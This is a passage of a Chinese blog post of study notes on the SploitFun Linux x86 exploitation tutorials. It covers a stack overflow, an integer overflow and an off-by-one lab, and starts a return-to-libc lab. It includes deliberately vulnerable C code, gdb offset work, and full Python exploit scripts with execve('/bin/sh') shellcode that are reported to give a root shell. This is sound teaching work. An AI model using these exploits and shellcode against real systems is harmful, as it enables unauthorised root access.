class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span> </span>&#123;<br><span class="hljs-comment">/* [1] */</span> <span class="hljs-keyword">char</span> buf[<span class="hljs-number">256</span>];<br><span class="hljs-comment">/* [2] */</span> <span class="hljs-built_in">strcpy</span>(buf,argv[<span class="hljs-number">1</span>]);<br><span class="hljs-comment">/* [3] */</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input:%s\n&quot;</span>,buf);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1使用ubuntu1204x86版本进行编译"><a class="markdownIt-Anchor" href="#1使用ubuntu1204x86版本进行编译"></a> 1.使用Ubuntu12.04（x86）版本进行编译</h2> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730165935638.png" alt="image-20210730165935638" style="zoom:80%;"><img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170014233.png" alt="image-20210730170014233" style="zoom:80%;"><h2 id="2查看程序里的堆栈布局"><a class="markdownIt-Anchor" href="#2查看程序里的堆栈布局"></a> 2.查看程序里的堆栈布局</h2><p>gdb调试输入disassemble main</p> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170048792.png" alt="image-20210730170048792" style="zoom:80%;"><h2 id="3测试是否能覆盖返回地址"><a class="markdownIt-Anchor" href="#3测试是否能覆盖返回地址"></a> 3.测试是否能覆盖返回地址</h2><p>先通过python输入大量的A</p> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170137935.png" alt="image-20210730170137935" style="zoom:80%;"><p>然后通过gdb查看此时eip的地址</p> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170157849.png" alt="image-20210730170157849" style="zoom:80%;"><p>可以看到此时eip的地址为0x41414141，41为A在内存里的值，所以eip的地址被输入的A覆盖了。</p><h2 id="4准确覆盖返回地址测试"><a class="markdownIt-Anchor" href="#4准确覆盖返回地址测试"></a> 4.准确覆盖返回地址测试</h2> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170220140.png" alt="image-20210730170220140" style="zoom:80%;"><p>我们可以知道返回地址的位置是0x100+0x8+0x4=0x10c</p><p>其中</p><p>0x100 是 ‘buf’ 的大小 0x8 是 对齐空间 0x4 是调用者的ebp</p><p>这时候我们可以测试输入268<em>A和4</em>B，我们就可以吧返回地址覆盖成0x42424242</p><p>Gdb调试测试如下：</p> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170248840.png" alt="image-20210730170248840" style="zoom:80%;"><p>可以看到重新调试之后，eip的地址覆盖成了0x42424242</p><h2 id="5构建exp攻击"><a class="markdownIt-Anchor" href="#5构建exp攻击"></a> 5.构建exp攻击</h2><p>首先我们得知道buf的地址，我们先把攻击的的脚本用来输入，再使用gdb调试看返回地址的位置</p> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170515205.png" alt="image-20210730170515205" style="zoom:80%;"><p>然后查看栈中shellcode的返回的位置</p> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170531756.png" alt="image-20210730170531756" style="zoom:80%;"><p>*ret_addr可以为&quot;\x90&quot;中任意一个地址，&quot;\x90&quot;在shellcode为nop空操作</p><p>找到shellcode的位置是0xbffff224，然后将攻击脚本中ret_addr改为0xbffff220</p> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170611805.png" alt="image-20210730170611805" style="zoom:80%;"><p>运行即可成功拿到root shell</p><h1 id="实验二整数溢出"><a class="markdownIt-Anchor" href="#实验二整数溢出"></a> 实验二：整数溢出</h1><p><strong>实验平台：<strong><strong>ubuntu 12.04 LTS</strong></strong>（<strong><strong>x86</strong></strong>）</strong></p><p><strong>Glibc</strong>**：****(Ubuntu EGLIBC 2.15-0ubuntu10.6) 2.15**</p><h2 id="1-原理"><a class="markdownIt-Anchor" href="#1-原理"></a> 1. 原理</h2><p>什么是整数溢出？</p><p>存储大于最大支持值的值称为整数溢出。整数溢出本身不会导致任意代码执行，但整数溢出可能会导致堆栈溢出或堆溢出，这可能导致任意代码执行。</p><p>数据类型大小及范围：</p><img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170757200.png" alt="image-20210730170757200" style="zoom:80%;">                               <p>当我们试图存储一个大于最大支持值的值时，我们的值会被包装 。例如，当我们尝 试将 2147483648 存储到带符号的 int 数据类型时，它将被包装并存储 为 -21471483648 。这被称为整数溢出，这种溢出可能导致任意代码执行 整数下溢 类似地，存储小于最小支持值的值称为整数下溢。例如，当我们尝试 将 -2147483649 存储到带符号的int数据类型时，它将被包装并存储 为 21471483647 .这称为整数下溢。在这里我只会谈论整数溢出，但是这个过程对 于下溢也是一样的！</p><p>漏洞代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//vuln.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">store_passwd_indb</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* passwd)</span> </span>&#123;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">validate_uname</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* uname)</span> </span>&#123;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">validate_passwd</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* passwd)</span> </span>&#123;<br><span class="hljs-keyword">char</span> passwd_buf[<span class="hljs-number">11</span>];<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> passwd_len = <span class="hljs-built_in">strlen</span>(passwd); <span class="hljs-comment">/* [1] */</span><br><span class="hljs-keyword">if</span>(passwd_len &gt;= <span class="hljs-number">4</span> &amp;&amp; passwd_len &lt;= <span class="hljs-number">8</span>) &#123; <span class="hljs-comment">/* [2] */</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Valid Password\n&quot;</span>); <span class="hljs-comment">/* [3] */</span><br>fflush(<span class="hljs-built_in">stdout</span>);<br><span class="hljs-built_in">strcpy</span>(passwd_buf,passwd); <span class="hljs-comment">/* [4] */</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Invalid Password\n&quot;</span>); <span class="hljs-comment">/* [5] */</span><br>fflush(<span class="hljs-built_in">stdout</span>);<br>&#125;<br>store_passwd_indb(passwd_buf); <span class="hljs-comment">/* [6] */</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span> </span>&#123;<br><span class="hljs-keyword">if</span>(argc!=<span class="hljs-number">3</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage Error: \n&quot;</span>);<br>fflush(<span class="hljs-built_in">stdout</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br>validate_uname(argv[<span class="hljs-number">1</span>]);<br>validate_passwd(argv[<span class="hljs-number">2</span>]);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-编译以及溢出点"><a class="markdownIt-Anchor" href="#2-编译以及溢出点"></a> 2. 编译以及溢出点</h2><p>编译指令</p><img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170859269.png" alt="image-20210730170859269" style="zoom:80%;"><p>漏洞代码中上述漏洞代码的 [1] 行显示了一个整数溢出错误。 strlen 的返回类型</p><p>是 size_t （ unsigned int ），它存储在 unsigned char 数据类型中。因</p><p>此，任何大于 unsigned char 的最大支持值的值都会导致整数溢出。因此当密码</p><p>整数溢出长度为261时，261将被包裹并存储为 passwd_len 变量中的5！由于这个整数溢出，可以绕过行 [2] 执行的边界检查，从而导致基于堆栈的缓冲区溢出！</p><h2 id="3-堆栈和溢出测试"><a class="markdownIt-Anchor" href="#3-堆栈和溢出测试"></a> 3. 堆栈和溢出测试</h2><p>用gdb查看堆栈</p><pre><code>                                                      &lt;img src=&quot;image-20210730170924024.png&quot; alt=&quot;image-20210730170924024&quot; style=&quot;zoom:80%;&quot; /&gt;</code></pre><img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170955621.png" alt="image-20210730170955621" style="zoom:80%;"><p>此时堆栈结构为</p><img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730171019424.png" alt="image-20210730171019424" style="zoom:80%;"><p>测试1：是否可以覆盖返回地址？</p> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730171129071.png" alt="image-20210730171129071" style="zoom:80%;"><p>输入261个A后可以看到返回地址确实成了0x41414141</p><p>测试2：目的缓冲区的偏移量是多少？</p><p>这里让我们从缓冲区 passwd_buf 中找出什么偏移返回地址。反汇编并绘制了 validate_passwd 的堆栈布局，现在可以尝试找到偏移位置信息！堆栈布局显 示返回地址位于缓冲区 passwd_buf 的偏移（ 0x18 ）处。 0x18 计算如下：</p><p>0xb ：passwd_buf 的大小</p><p>0x1： passwd_len 的大小</p><p>0x4：对齐空间</p><p>0x4：edi</p><p>0x4：调用者的ebp</p><p>测试输入&quot;A&quot; * 24 + “B” * 4 + “C” * 233，用B覆盖返回地址</p> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730171149653.png" alt="image-20210730171149653" style="zoom:80%;"><p>测试返回地址被覆盖成了0x42424242，说明判断是对的</p><h2 id="4构建exp攻击"><a class="markdownIt-Anchor" href="#4构建exp攻击"></a> 4.构建exp攻击</h2><p>通过查看内存可以找到</p> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730171203079.png" alt="image-20210730171203079" style="zoom:80%;"><p>返回地址的位置在0xbffff20c开始处</p><p>我们的攻击脚本中返回地址的选取是在这个返回地址后的100个“\x90”中</p><p>我们随机选取一个地址0xbffff240攻击脚本改为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#exp.py</span><br><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> call<br>arg1 = <span class="hljs-string">&quot;sploitfun&quot;</span><br><span class="hljs-comment">#Stack address where shellcode is copied.</span><br>ret_addr = <span class="hljs-number">0xbffff240</span><br><span class="hljs-comment">#Spawn a shell</span><br><span class="hljs-comment">#execve(/bin/sh)</span><br>scode = <span class="hljs-string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span><br><span class="hljs-comment">#endianess convertion</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">conv</span>(<span class="hljs-params">num</span>):</span><br> <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;&lt;I&quot;</span>,num)<span class="hljs-comment">#nk + RA + NOP&#x27;s + Shellcode</span><br>arg2 = <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">24</span><br>arg2 += conv(ret_addr);<br>arg2 += <span class="hljs-string">&quot;\x90&quot;</span> * <span class="hljs-number">100</span><br>arg2 += scode<br>arg2 += <span class="hljs-string">&quot;C&quot;</span> * <span class="hljs-number">108</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Calling vulnerable program&quot;</span><br>call([<span class="hljs-string">&quot;./vuln&quot;</span>, arg1, arg2])<br><span class="hljs-built_in">print</span> arg2<br> <br></code></pre></td></tr></table></figure><p>运行测试可以得到rootshell</p> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730171301037.png" alt="image-20210730171301037" style="zoom:80%;"><h1 id="实验三off-by-one-漏洞基于栈"><a class="markdownIt-Anchor" href="#实验三off-by-one-漏洞基于栈"></a> 实验三：Off-By-One 漏洞（基于栈）</h1><p><strong>实验平台：<strong><strong>ubuntu 12.04 LTS</strong></strong>（<strong><strong>x86</strong></strong>）</strong></p><p><strong>Glibc</strong>**：****(Ubuntu EGLIBC 2.15-0ubuntu10.6) 2.15**</p><h2 id="1-原理-2"><a class="markdownIt-Anchor" href="#1-原理-2"></a> 1. 原理</h2><p><strong>什么是off by one？</strong></p><p>将源字符串复制到目标缓冲区可能会导致off by one 1、源字符串长度等于目标缓冲区长度。 当源字符串长度等于目标缓冲区长度时，单个 NULL 字节将被复制到目标缓冲区上 方。这里由于目标缓冲区位于堆栈中，所以单个 NULL 字节可以覆盖存储在堆栈中 的调用者的EBP的最低有效位（LSB），这可能导致任意的代码执行。<br>漏洞代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//vuln.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">foo</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* arg)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">bar</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* arg)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">foo</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* arg)</span> </span>&#123;<br>bar(arg); <span class="hljs-comment">/* [1] */</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">bar</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* arg)</span> </span>&#123;<br><span class="hljs-keyword">char</span> buf[<span class="hljs-number">256</span>];<br><span class="hljs-built_in">strcpy</span>(buf, arg); <span class="hljs-comment">/* [2] */</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span> </span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">1</span>])&gt;<span class="hljs-number">256</span>) &#123; <span class="hljs-comment">/* [3] */</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Attempted Buffer Overflow\n&quot;</span>);<br>fflush(<span class="hljs-built_in">stdout</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br>foo(argv[<span class="hljs-number">1</span>]); <span class="hljs-comment">/* [4] */</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br><br></code></pre></td></tr></table></figure><h2 id="2-编译以及溢出点-2"><a class="markdownIt-Anchor" href="#2-编译以及溢出点-2"></a> 2. 编译以及溢出点</h2><p><strong>编译指令：</strong></p>   <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730171628517.png" alt="image-20210730171628517" style="zoom:80%;">                       <p>上述漏洞代码的第 [2] 行是可能发生off by one溢出的地方。目标缓冲区长度为 256，因此长度为256字节的源字符串可能导致任意代码执行。 如何执行任意代码执行？ 使用称为“EBP覆盖”的技术实现任意代码执行。如果调用者的EBP位于目标缓冲区 之上，则在 strcpy 之后，单个 NULL 字节将覆盖调用者EBP的LSB。</p><p>用gdb查看堆栈布局</p> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730171655079.png" alt="image-20210730171655079" style="zoom:80%;"><p>通过这样我们得到的堆栈布局是</p> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730171725012.png" alt="image-20210730171725012" style="zoom:80%;"><p>这样的</p><p>当我们已经知道256字节的用户输入，用空字节可以覆盖 foo 的EBP的LSB。所以 当 foo 的存储在目标缓冲区 buf 之上的EBP被一个 NULL（“\x00”） 字节所覆盖时，ebp 从 0xbffff2d8 变为 0xbffff200 。从堆栈布局我们可以看到堆栈位 置 0xbffff200 是目标缓冲区 buf 的一部分，由于用户输入被复制到该目标缓冲 区，攻击者可以控制这个堆栈位置（ 0xbffff200 ），因此他控制指令指针（eip ）使用他可以实现任意代码执行。</p><h2 id="3溢出测试"><a class="markdownIt-Anchor" href="#3溢出测试"></a> 3．溢出测试</h2><p>测试步骤1：EBP是否覆盖，从而可能覆盖返回地址</p><p>测试输入256个“A”</p> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730171746339.png" alt="image-20210730171746339" style="zoom:80%;"><p>可以看到eip被覆盖成了0x41414141</p><p>测试步骤2：距离目标缓冲区的偏移是多少？</p><p>现在，我们可以从目标缓冲区 buf 的起始位置开始找到偏移量，我们需要替换我们的返回地址。记住在off by one 漏洞中，我们不会覆盖堆栈中存储的实际返回地址（像我们在基于堆栈的缓冲区溢出中），而是攻击者控制的目标缓冲区 buf 内的4字节内存区域将被视为返回地址位置（在off by one溢出之后）。因此，我们需要找到这个返回地址位置偏移量（从 buf ），它是目标缓冲区 buf 本身的一部分</p><p>通过调试，输入256个a，gdb查看内存发现在0xbffff218位置的ebp的值被覆盖成了0xbffff200</p> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/Users\17473\Desktop\博客\SploitFun Linux x86 Exploit 开发系列教程\image-20210730171807528.png" alt="image-20210730171807528" style="zoom:80%;"><p>如果ebp的地址为0xbffff200，那我们就知道eip的位置应该为0xbffff204</p><p>这个位置距离buf起始位置是0x204-0x118=236，所以我们输入的236个A后面的数就可以覆盖到eip指针</p><p>尝试输入</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">r</span> `python -c &#x27;print <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">236</span>+<span class="hljs-string">&quot;B&quot;</span>*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;C&quot;</span>*<span class="hljs-number">16</span>&#x27;`<br></code></pre></td></tr></table></figure><p>此时的内存空间如下</p><img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730171936781.png" alt="image-20210730171936781" style="zoom:80%;"><p>这个时候0xbffff204的位置刚好被覆盖成了0x42424242，继续运行程序发现eip指针变成了0x42424242</p><h2 id="4构建exp"><a class="markdownIt-Anchor" href="#4构建exp"></a> 4.构建exp</h2><p>根据上面测试的内容，我们可以构建这样的exp：</p><p>返回地址设定为0xbffff180，buf里的内容先是输入100个A（这时buf应该在0xbffff170左右）然后再接上30个nop指令和shellcode，构建如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> call<br><span class="hljs-comment">#Spawn a shell.</span><br><span class="hljs-comment">#execve(/bin/sh) Size- 28 bytes.</span><br>scode = <span class="hljs-string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90&quot;</span><br>ret_addr = <span class="hljs-number">0xbffff180</span><br><span class="hljs-comment">#endianess conversion</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">conv</span>(<span class="hljs-params">num</span>):</span><br> <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;&lt;I&quot;</span>,num)<span class="hljs-comment">#nk + RA + NOP&#x27;s + Shellcode+junk</span><br>buf = <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">100</span><br>buf += <span class="hljs-string">&quot;\x90&quot;</span> * <span class="hljs-number">30</span><br>buf += scode<br>buf += <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">78</span><br>buf += conv(ret_addr)<br>buf += <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">16</span><br><span class="hljs-comment">#print &quot;Calling vulnerable program&quot;</span><br><span class="hljs-built_in">print</span> buf<br><span class="hljs-comment">#call([&quot;./vuln&quot;, buf])</span><br><br></code></pre></td></tr></table></figure><p>使用gdb调试，然后输入此exp可以拿到rootshell</p><p>*<strong>理论是正确的，直接运行我就拿不到，不知道为什么</strong></p> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730172617549.png" alt="image-20210730172617549" style="zoom:80%;"><h1 id="实验四使用-return-to-libc-绕过-nx-位"><a class="markdownIt-Anchor" href="#实验四使用-return-to-libc-绕过-nx-位"></a> 实验四：使用 return-to-libc 绕过 NX 位</h1><p><strong>实验平台：<strong><strong>ubuntu 12.04 LTS</strong></strong>（<strong><strong>x86</strong></strong>）</strong></p><p><strong>Glibc</strong>**：****(Ubuntu EGLIBC 2.15-0ubuntu10.6) 2.15**</p><h2 id="1-原理-3"><a class="markdownIt-Anchor" href="#1-原理-3"></a> 1． 原理</h2><p>在以前的帖子中，我们看到了这个攻击者复制shellcode堆栈并跳转到它！ 为了成功利用漏洞代码。为了阻止攻击者的行动，安全研究人员提出了一个名 为“NX 位”的漏洞缓解！</p><p><strong>什么是NX 位？</strong></p><p>它是一种利用缓解技术，使某些内存区域不可执行，并使可执行区域不可写。示 例：使数据，堆栈和堆段不可执行，而代码段不可写。 在NX 位打开的情况下，我们基于堆栈的缓冲区溢出的经典方法将无法利用此漏洞。因为在经典的方法中，shellcode被复制到堆栈中，返回地址指向shellcode。 但是现在由于堆栈不再可执行，我们的漏洞利用失败！</p><p>漏洞代码：此代码与以前发布的漏洞代码相同，稍作修改。稍后我会谈谈需要修改的内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//vuln.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span> </span>&#123;<br><span class="hljs-keyword">char</span> buf[<span class="hljs-number">256</span>]; <span class="hljs-comment">/* [1] */</span><br><span class="hljs-built_in">strcpy</span>(buf,argv[<span class="hljs-number">1</span>]); <span class="hljs-comment">/* [2] */</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,buf); <span class="hljs-comment">/* [3] */</span><br>fflush(<span class="hljs-built_in">stdout</span>); <span class="hljs-comment">/* [4] */</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure><h2 id="2编译以及溢出点"><a class="markdownIt-Anchor" href="#2编译以及溢出点"></a> 2.编译以及溢出点</h2><p>以下是编译过程，没有添加-z execstack的参数进行编译，说明现在堆栈是不可执行的</p> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730172751113.png" alt="image-20210730172751113" 